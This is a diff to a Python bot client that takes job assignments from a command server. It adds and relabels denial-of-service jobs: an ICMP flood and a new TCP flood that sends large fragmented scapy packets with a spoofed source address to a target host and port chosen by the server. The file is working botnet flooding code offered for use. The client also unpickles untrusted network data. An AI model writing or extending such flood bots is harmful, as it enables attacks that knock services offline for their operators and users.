@@ -12,6 +12,7 @@ conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # Create client socket
 conn.connect(ADDR) # Connects socket to remote host
 print(f"Connected to server @ {ADDR}\n")
 val = "y"
+FLOOD_AMOUNT = 10 #FLOOD_AMOUNT * 1000 = Number of packets sent by each bot
 
 # --- Shared Messages ---
 
@@ -39,6 +40,7 @@ def send(v): # Function to send messages to the server
         print(f"Waiting for server @ {ADDR}\n")
         m = conn.recv(2048)
         v = pickle.loads(m)
+        print("Message recieved")
         if v[0] == JOB_ASSIGNMENT:
             print(f"Received a job assignment from server @ {ADDR}")
             if v[1] == 1:
@@ -47,6 +49,8 @@ def send(v): # Function to send messages to the server
                 job2(v)
             elif v[1] == 3:
                 job3(v)
+            elif v[1] == 4:
+                job4(v)
         elif v[0] == COMPLETION_ACK:
             print(f"Server @ {ADDR} acknowledged completion\n")
         
@@ -86,10 +90,8 @@ def job2(v):
     else:
         send([ JOB_REPORT, JOB_COMPLETE, "Open / filtered"])
     
-    
-
-def job3(v):
-    print(f"Working on job 3 for @ {ADDR}")
+def job3(v): #ICMP Flood
+    print(f"ICMP attack commencing on {v[2]} for @ {ADDR}")
     try:
       ip_layer = IP(dst=v[2], src='192.168.2.1')
       icmp_layer = ICMP()
@@ -99,6 +101,22 @@ def job3(v):
     except:
       send([ JOB_REPORT, JOB_COMPLETE, JOB_FAILURE ])
 
+def job4(v): #TCP flood attack
+     target = v[2]
+     port = v[3]
+     print(f"Commencing TCP flood attack on {target} for {ADDR}")
+     try:
+        ipLayer = IP(dst=target,src = "192.168.50.146")
+        icmpLayer = TCP(dport = port)
+        packet = ipLayer/icmpLayer
+        
+        scapy.all.send(fragment(packet/("X"*60000)), count = 1) #receives no replies for sent packets, count = number of packets sent
+        
+        
+        send([ JOB_REPORT, JOB_COMPLETE, JOB_SUCCESS ])
+
+     except:
+        send([ JOB_REPORT, JOB_COMPLETE, JOB_FAILURE ]) 
 
 
 # --- Start ---
